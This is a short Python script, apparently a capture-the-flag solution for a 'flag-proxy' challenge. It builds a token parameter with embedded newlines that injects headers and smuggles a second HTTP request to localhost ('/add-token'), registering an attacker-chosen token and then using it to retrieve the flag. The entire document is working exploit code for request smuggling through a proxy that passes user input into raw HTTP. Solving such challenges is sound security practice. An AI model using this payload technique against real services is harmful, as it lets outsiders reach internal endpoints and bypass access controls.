import requests
import random
import string
import os

URL = os.environ.get("URL", "http://flag-proxy.challs.teamitaly.eu")

token = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

payload = 'AAAA\n'
payload += 'Content-Length: 0\n'
payload += 'Connection: keep-alive\n'
payload += '\n'
payload += f'GET /add-token?token={token} HTTP/1.0\n'
payload += 'Host: localhost'

response = requests.get(f"{URL}/flag", params={'token': payload})
print(response.text)

response = requests.get(f"{URL}/flag", params={'token': token})
print(response.text)
